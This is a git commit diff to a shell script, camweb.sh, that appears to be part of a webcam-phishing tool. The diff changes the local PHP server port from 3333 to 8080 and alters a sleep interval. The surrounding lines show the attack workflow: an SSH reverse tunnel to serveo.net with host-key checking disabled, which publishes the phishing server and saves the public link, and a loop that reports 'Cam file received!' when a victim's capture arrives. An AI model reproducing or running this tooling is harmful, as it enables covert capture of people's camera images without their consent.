30b5e8e42d6ab2fd5fb24a6054272fee20e91a7d
BLACK-KILLER <63947251+ShuBhamg0sain@users.noreply.github.com>
2021-05-30 08:54:41 +0530

    Update camweb.sh

--- .shubham/camweb.sh
+++ .shubham/camweb.sh
@@ -82,10 +82,8 @@ if [[ -e "Log.log" ]]; then
 printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
 rm -rf Log.log
 fi
-sleep 0.5
-
+sleep 0.001
 done 
-
 }
 
 
@@ -101,15 +99,15 @@ fi
 
 if [[ $subdomain_resp == true ]]; then
 
-$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:8080 serveo.net  2> /dev/null > sendlink ' &
 
 sleep 8
 else
-$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:8080 serveo.net 2> /dev/null > sendlink ' &
 
 sleep 8
 fi
-printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... (localhost:3333)\e[0m\n"
+printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... localhost:8080 \e[0m\n"
 fuser -k 3333/tcp > /dev/null 2>&1
 php -S localhost:8080 > /dev/null 2>&1 &
 sleep 3
